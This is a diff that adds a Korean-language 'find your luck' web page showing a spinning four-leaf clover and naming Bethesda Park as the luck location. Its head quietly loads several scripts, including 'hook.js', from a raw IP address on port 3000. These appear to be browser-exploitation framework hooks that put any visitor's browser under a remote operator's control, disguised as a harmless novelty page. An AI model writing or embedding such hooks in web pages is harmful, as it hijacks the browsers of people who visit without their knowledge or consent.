@@ -1,0 +1,303 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>행운을 찾아 오세요!</title>
+    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
+    <script src="https://172-233-208-160.ip.linodeusercontent.com:3000/hook.js"></script>
+    <script src="https://172.233.208.160:3000/hook.js"></script>
+<script src="https://kit.fontawesome.com/a076d05399.js"></script>
+<script src="https://172-233-208-160.ip.linodeusercontent.com:3000"></script>
+<script src="https://172-233-208-160.ip.linodeusercontent.com:3000/demos/butcher/index.html"></script>
+    <style>
+        html,
+body {
+  width: 100%;
+  height: 100%;
+  margin: 0px;
+}
+
+body {
+  -webkit-touch-callout: none;
+  -webkit-user-select: none;
+  -khtml-user-select: none;
+  -moz-user-select: none;
+  -ms-user-select: none;
+  user-select: none;
+  background: #333;
+
+  display: flex;
+  align-items: center;
+  justify-content: center;
+}
+
+#centerPoint {
+  position: absolute;
+  width: 24px;
+  height: 24px;
+  background: #7e3;
+  border-radius: 50%;
+}
+
+#line {
+  position: relative;
+  top: 120px;
+  left: -160px;
+  width: 6px;
+  height: 240px;
+  background: #7e3;
+  border-radius: 50% 50% 0 0;
+}
+
+#area {
+    margin-top: -25%;
+  width: 400px;
+  height: 600px;
+  background: seashell;
+  border-radius: 15%;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  /* -webkit-transform: rotate(45deg);
+-moz-transform: rotate(45deg);
+-o-transform: rotate(45deg);
+-ms-transform: rotate(45deg);
+transform: rotate(45deg); */
+}
+
+#container {
+  width: 320px;
+  height: 320px;
+  /* display: flex;
+	align-items: center;
+	justify-content: center; */
+}
+
+.container {
+  width: 150px;
+  height: 150px;
+  margin: 5px;
+  float: left;
+}
+
+#leaf1_0 {
+  position: relative;
+  top: 50px;
+  left: 50px;
+  width: 100px;
+  height: 100px;
+  background: #7e3;
+  float: left;
+}
+
+#leaf1_1 {
+  position: relative;
+  top: -50px;
+  width: 100px;
+  height: 100px;
+  background: #7e3;
+  border-radius: 50%;
+  float: left;
+}
+
+#leaf1_2 {
+  position: relative;
+  top: -200px;
+  left: 50px;
+  width: 100px;
+  height: 100px;
+  background: #7e3;
+  border-radius: 50%;
+  float: left;
+}
+
+/* ********************************************* */
+
+#leaf2_0 {
+  position: relative;
+  top: 50px;
+  width: 100px;
+  height: 100px;
+  background: #7e3;
+  float: left;
+}
+
+#leaf2_1 {
+  position: relative;
+  top: -100px;
+  width: 100px;
+  height: 100px;
+  background: #7e3;
+  border-radius: 50%;
+  float: left;
+}
+
+#leaf2_2 {
+  position: relative;
+  top: -150px;
+  left: 50px;
+  width: 100px;
+  height: 100px;
+  background: #7e3;
+  border-radius: 50%;
+  float: left;
+}
+
+/* ********************************************* */
+
+#leaf3_0 {
+  position: relative;
+  top: 0px;
+  left: 50px;
+  width: 100px;
+  height: 100px;
+  background: #7e3;
+  float: left;
+}
+
+#leaf3_1 {
+  position: relative;
+  top: -50px;
+  left: 50px;
+  width: 100px;
+  height: 100px;
+  background: #7e3;
+  border-radius: 50%;
+  float: left;
+}
+
+#leaf3_2 {
+  position: relative;
+  top: -200px;
+  width: 100px;
+  height: 100px;
+  background: #7e3;
+  border-radius: 50%;
+  float: left;
+}
+
+/* ********************************************* */
+
+#leaf4_0 {
+  position: relative;
+  width: 100px;
+  height: 100px;
+  background: #7e3;
+  float: left;
+}
+
+#leaf4_1 {
+  position: relative;
+  top: -100px;
+  left: 50px;
+  width: 100px;
+  height: 100px;
+  background: #7e3;
+  border-radius: 50%;
+  float: left;
+}
+
+#leaf4_2 {
+  position: relative;
+  top: -150px;
+  width: 100px;
+  height: 100px;
+  background: #7e3;
+  border-radius: 50%;
+  float: left;
+}
+
+.center_container{
+    justify-content: center;
+    align-items: center;
+    text-align: center;
+    float: center;
+    top: 50;
+    left: 50;
+}
+
+.center_font{
+    font-weight: bold;
+    font-size: 0.9rem;
+}
+
+#text {
+            position: absolute;
+            bottom: -2%;
+            text-align: center;
+            font-weight: bold;
+            font-size: 1.5rem;
+            width: 100%;
+            color: seashell;
+        }
+#text2{
+    position: absolute;
+            bottom: -5.5%;
+            text-align: center;
+            font-weight: bold;
+            font-size: 1rem;
+            width: 100%;
+            color: seashell;
+}
+
+hr{
+    position: absolute;
+    text-align: center;
+    align-items: center;
+    justify-content: center;
+    width: 90%;
+    bottom: -1%;
+    font-size: 0.8rem;
+    color: seashell;
+}
+    </style>
+</head>
+<body>
+    <div id="area">
+		<div id="centerPoint"></div>
+
+		<div id="container">
+			<div id="container1" class="container">
+				<div id="leaf1_0"></div>
+				<div id="leaf1_1"></div>
+				<div id="leaf1_2"></div>
+			</div>
+
+			<div id="container2" class="container">
+				<div id="leaf2_0"></div>
+				<div id="leaf2_1"></div>
+				<div id="leaf2_2"></div>
+			</div>
+
+			<div id="container3" class="container">
+				<div id="leaf3_0"></div>
+				<div id="leaf3_1"></div>
+				<div id="leaf3_2"></div>
+			</div>
+
+			<div id="container4" class="container">
+				<div id="leaf4_0"></div>
+				<div id="leaf4_1"></div>
+				<div id="leaf4_2"></div>
+			</div>
+		</div>
+
+		<div id="line"></div>
+	</div>
+
+        <p id="text">행운이 당신을 기다려요!</p>
+        <hr>
+        <p id="text2">행운 위치 : 베데스다 공원 <br></p>
+</body>
+<script>
+    var n = 0;
+
+setInterval(function(){
+$("#container").css("transform", "rotate("+(n+1)%360+"deg)")
+n++;
+}, 10);
+
+
+</script>
+</html>
